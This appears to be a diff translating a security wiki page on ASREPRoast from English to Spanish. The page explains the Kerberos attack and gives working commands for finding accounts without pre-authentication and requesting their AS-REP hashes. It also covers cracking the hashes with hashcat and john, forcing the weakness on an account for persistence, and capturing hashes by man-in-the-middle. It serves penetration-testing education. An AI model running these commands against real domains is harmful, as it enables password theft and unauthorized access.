@@ -4,31 +4,30 @@
 
 <figure><img src="../../images/image (3).png" alt=""><figcaption></figcaption></figure>
 
-Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!
+¡Únete al servidor de [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para comunicarte con hackers experimentados y cazadores de recompensas por errores!
 
-**Hacking Insights**\
-Engage with content that delves into the thrill and challenges of hacking
+**Perspectivas de Hacking**\
+Participa en contenido que profundiza en la emoción y los desafíos del hacking
 
-**Real-Time Hack News**\
-Keep up-to-date with fast-paced hacking world through real-time news and insights
+**Noticias de Hackeo en Tiempo Real**\
+Mantente al día con el mundo del hacking de ritmo rápido a través de noticias e información en tiempo real
 
-**Latest Announcements**\
-Stay informed with the newest bug bounties launching and crucial platform updates
+**Últimos Anuncios**\
+Mantente informado sobre las nuevas recompensas por errores que se lanzan y actualizaciones cruciales de la plataforma
 
-**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!
+**Únete a nosotros en** [**Discord**](https://discord.com/invite/N3FrSbmwdy) y comienza a colaborar con los mejores hackers hoy mismo!
 
 ## ASREPRoast
 
-ASREPRoast is a security attack that exploits users who lack the **Kerberos pre-authentication required attribute**. Essentially, this vulnerability allows attackers to request authentication for a user from the Domain Controller (DC) without needing the user's password. The DC then responds with a message encrypted with the user's password-derived key, which attackers can attempt to crack offline to discover the user's password.
+ASREPRoast es un ataque de seguridad que explota a los usuarios que carecen del **atributo requerido de pre-autenticación de Kerberos**. Esencialmente, esta vulnerabilidad permite a los atacantes solicitar autenticación para un usuario desde el Controlador de Dominio (DC) sin necesidad de la contraseña del usuario. El DC luego responde con un mensaje cifrado con la clave derivada de la contraseña del usuario, que los atacantes pueden intentar descifrar fuera de línea para descubrir la contraseña del usuario.
 
-The main requirements for this attack are:
+Los principales requisitos para este ataque son:
 
-- **Lack of Kerberos pre-authentication**: Target users must not have this security feature enabled.
-- **Connection to the Domain Controller (DC)**: Attackers need access to the DC to send requests and receive encrypted messages.
-- **Optional domain account**: Having a domain account allows attackers to more efficiently identify vulnerable users through LDAP queries. Without such an account, attackers must guess usernames.
+- **Falta de pre-autenticación de Kerberos**: Los usuarios objetivo no deben tener esta función de seguridad habilitada.
+- **Conexión al Controlador de Dominio (DC)**: Los atacantes necesitan acceso al DC para enviar solicitudes y recibir mensajes cifrados.
+- **Cuenta de dominio opcional**: Tener una cuenta de dominio permite a los atacantes identificar de manera más eficiente a los usuarios vulnerables a través de consultas LDAP. Sin tal cuenta, los atacantes deben adivinar los nombres de usuario.
 
-#### Enumerating vulnerable users (need domain credentials)
-
+#### Enumerando usuarios vulnerables (necesita credenciales de dominio)
 ```bash:Using Windows
 Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
 ```
@@ -36,9 +35,7 @@ Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
 ```bash:Using Linux
 bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
 ```
-
-#### Request AS_REP message
-
+#### Solicitar mensaje AS_REP
 ```bash:Using Linux
 #Try all the usernames in usernames.txt
 python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
@@ -50,21 +47,17 @@ python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashc
 .\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
 Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
 ```
-
 > [!WARNING]
-> AS-REP Roasting with Rubeus will generate a 4768 with an encryption type of 0x17 and preauth type of 0.
+> AS-REP Roasting con Rubeus generará un 4768 con un tipo de cifrado de 0x17 y un tipo de preautenticación de 0.
 
 ### Cracking
-
 ```bash
 john --wordlist=passwords_kerb.txt hashes.asreproast
 hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
 ```
+### Persistencia
 
-### Persistence
-
-Force **preauth** not required for a user where you have **GenericAll** permissions (or permissions to write properties):
-
+Forzar **preauth** no requerido para un usuario donde tienes permisos **GenericAll** (o permisos para escribir propiedades):
 ```bash:Using Windows
 Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
 ```
@@ -72,12 +65,10 @@ Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbos
 ```bash:Using Linux
 bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
 ```
+## ASREProast sin credenciales
 
-## ASREProast without credentials
-
-An attacker can use a man-in-the-middle position to capture AS-REP packets as they traverse the network without relying on Kerberos pre-authentication being disabled. It therefore works for all users on the VLAN.\
-[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) allows us to do so. Moreover, the tool forces client workstations to use RC4 by altering the Kerberos negotiation.
-
+Un atacante puede usar una posición de hombre en el medio para capturar paquetes AS-REP mientras atraviesan la red sin depender de que la pre-autenticación de Kerberos esté deshabilitada. Por lo tanto, funciona para todos los usuarios en la VLAN.\
+[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) nos permite hacerlo. Además, la herramienta obliga a las estaciones de trabajo de los clientes a usar RC4 al alterar la negociación de Kerberos.
 ```bash
 # Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
 ASRepCatcher relay -dc $DC_IP
@@ -88,8 +79,7 @@ ASRepCatcher relay -dc $DC_IP --disable-spoofing
 # Passive listening of AS-REP packets, no packet alteration
 ASRepCatcher listen
 ```
-
-## References
+## Referencias
 
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
 
@@ -97,18 +87,17 @@ ASRepCatcher listen
 
 <figure><img src="../../images/image (3).png" alt=""><figcaption></figcaption></figure>
 
-Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!
+¡Únete al servidor de [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para comunicarte con hackers experimentados y cazadores de recompensas por errores!
 
-**Hacking Insights**\
-Engage with content that delves into the thrill and challenges of hacking
+**Perspectivas de Hacking**\
+Participa en contenido que profundiza en la emoción y los desafíos del hacking
 
-**Real-Time Hack News**\
-Keep up-to-date with fast-paced hacking world through real-time news and insights
+**Noticias de Hackeo en Tiempo Real**\
+Mantente al día con el mundo del hacking de ritmo rápido a través de noticias e información en tiempo real
 
-**Latest Announcements**\
-Stay informed with the newest bug bounties launching and crucial platform updates
+**Últimos Anuncios**\
+Mantente informado sobre las nuevas recompensas por errores que se lanzan y actualizaciones cruciales de la plataforma
 
-**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!
+**Únete a nosotros en** [**Discord**](https://discord.com/invite/N3FrSbmwdy) y comienza a colaborar con los mejores hackers hoy mismo!
 
 {{#include ../../banners/hacktricks-training.md}}
-
